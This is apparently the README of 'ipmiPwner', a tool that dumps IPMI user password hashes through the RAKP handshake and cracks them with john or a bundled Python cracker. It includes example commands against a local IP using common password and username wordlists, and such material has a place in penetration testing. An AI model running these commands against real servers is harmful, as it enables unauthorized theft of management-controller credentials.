# ipmiPwner
This exploit dump the user hash provided through the use of ipmitool. Dumps IPMI user hashes via the RAKP authentication handshake.

The script includes a built-in list of common usernames. If no user is specified it iterates the full list; you can also provide a custom wordlist.


## Dependencies

- ipmitool: `sudo apt install ipmitool`
- Python 3

## Setup

```sh
pip3 install -r requirements.txt
```

## Usage

```sh
# Help
python3 ipmipwner.py -h
# Example
python3 ipmipwner.py --host 192.168.1.12 -oH hash.txt
```

## Parameters

- `--help`  : Displays the help panel

**Required Arguments**

- `--host`  : Target host IP

**Cracking Arguments**

- `-c`      : Cracking tool: `john` | `python` (requires `-pW` and `-oH`)
- `-uW`     : User wordlist (defaults to built-in list)
- `-pW`     : Password wordlist
- `-oH`     : Output hash file
- `-oC`     : Output cracked hash file (required for `-c python`)

**Optional Arguments**

- `-p`      : Port, default: 623
- `-u`      : Single target user
- `-d`      : Delay between requests in seconds, default: 20
- `-r`      : Retry attempts per user, default: 2

## rakpcrk.py

Pure Python RAKP hash cracker. Used internally by `ipmipwner.py` when `-c python` is selected, but can also be run standalone:

```sh
python rakpcrk.py -f hash-example.txt -w wordlist.txt -o hash-cracked.txt
```

- `-f` : Hash file (output from `ipmipwner.py -oH`)
- `-w` : Password wordlist
- `-o` : Output file for the cracked result
- `-l` : Print progress every N lines, default: 1,000,000

## Examples

```sh
python3 ipmipwner.py --host 192.168.1.12 -oH hash
python3 ipmipwner.py --host 192.168.1.12 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
python3 ipmipwner.py --host 192.168.1.12 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -u root -c john -pW /usr/share/wordlists/rockyou.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -c python -pW /usr/share/wordlists/rockyou.txt -oH hash -oC crackedHash
```

## Collaboration

```sh
pip install -r requirements-dev.txt    # includes ruff for linting
```

Commit format:
- `feat:`     new functionality
- `fix:`      bug fixes or updates
- `docs:`     documentation changes
- `chore:`    project/config changes
- `refactor:` code improvements
- `sec:`      security changes

```sh
# Valid
git commit -m "fix: remove sudo requirement"

# Invalid
git commit -m "remove sudo requirement"
```
